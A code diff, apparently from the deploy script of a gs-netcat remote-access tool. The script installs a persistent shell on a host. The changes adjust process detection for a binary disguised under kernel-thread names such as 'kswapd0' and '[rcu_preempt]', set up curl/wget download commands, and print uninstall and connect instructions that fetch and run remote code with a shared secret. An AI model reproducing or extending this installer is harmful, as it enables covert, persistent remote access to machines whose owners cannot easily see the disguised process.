@@ -792,7 +792,7 @@ init_vars()
 	elif command -v pkill >/dev/null; then
 		KL_CMD="pkill"
 		KL_NAME="${BIN_HIDDEN_NAME_RX}"
-		KL_CMD_RUNCHK_UARG=("-0" "-U${UID}")
+		KL_CMD_RUNCHK_UARG=("-x" "-0" "-U${UID}")
 	elif command -v killall >/dev/null; then
 		KL_CMD="killall"
 		KL_NAME="${BIN_HIDDEN_NAME}"
@@ -845,21 +845,18 @@ init_vars()
 	local pids
 	# Linux 'pgrep kswapd0' would match _binary_ kswapd0 even if argv[0] is '[rcu_preempt]'
 	# and also matches kernel process '[kwapd0]'.
-	pids="$(pgrep "${BIN_HIDDEN_NAME_RX}" 2>/dev/null)"
+	pids="$(pgrep -x "${BIN_HIDDEN_NAME_RX}" 2>/dev/null)"
 	# OSX's pgrep works on argv[0] proc-name:
 	[[ -z $pids ]] && pids="$(pgrep "(${PROC_HIDDEN_NAME_RX})" 2>/dev/null)"
 
 	[[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }" # Convert multi line into single line
 	unset pids
 
-	# DL_CMD is used for help output of how to uninstall
-	if [[ -n "$GS_USELOCAL" ]]; then
-		DL_CMD="./deploy-all.sh"
-	elif command -v curl >/dev/null; then
+	if command -v curl >/dev/null; then
 		DL_CMD="$DL_CRL"
 	elif command -v wget >/dev/null; then
 		DL_CMD="$DL_WGT"
-	else
+	elif [[ -z "$GS_USELOCAL" ]]; then
 		# errexit "Need curl or wget."
 		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
 		errexit
@@ -879,10 +876,14 @@ init_vars()
 		# Read-timeout is 900 seconds by default.
 		DL=("wget" "-O-" "--connect-timeout=7" "--dns-timeout=7")
 		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
-
 	else
+		# Can happen if deploy-all.sh when no curl/wget
+		# but we still want to do a webhook.
 		DL=("false")   # Should not happen
 	fi
+
+	UNINST_CMD="$DL_CMD"
+	[[ -n "$GS_USELOCAL" ]] && UNINST_CMD="./deploy-all.sh"
 
 	[[ $SHELL == *"nologin"* ]] && unset SHELL
 	[[ $SHELL == *"jail"* ]] && unset SHELL  # /usr/local/cpanel/bin/jailshell
@@ -891,6 +892,7 @@ init_vars()
 	# Test that shell is a good shell.
 	[[ -n $SHELL ]] && [[ "$("$SHELL" -c "echo TRUE" 2>/dev/null)" != "TRUE" ]] && unset SHELL
 
+	DEBUGF "DL=${DL[*]}"
 	DEBUGF "OLD_PIDS='$OLD_PIDS'"
 	DEBUGF "SRC_PKG=$SRC_PKG"
 }
@@ -1177,7 +1179,7 @@ HOWTO_CONNECT_OUT()
 		xstr="GS_ARGS=-w "
 	}
 	# After all install attempts output help how to uninstall
-	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${UNINST_CMD}${CN}"
 	echo -e "--> To connect use one of the following
 --> ${CM}${str}gs-netcat -s \"${GS_SECRET}\" ${opt}${CN}
 --> ${CM}${str}${xstr}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
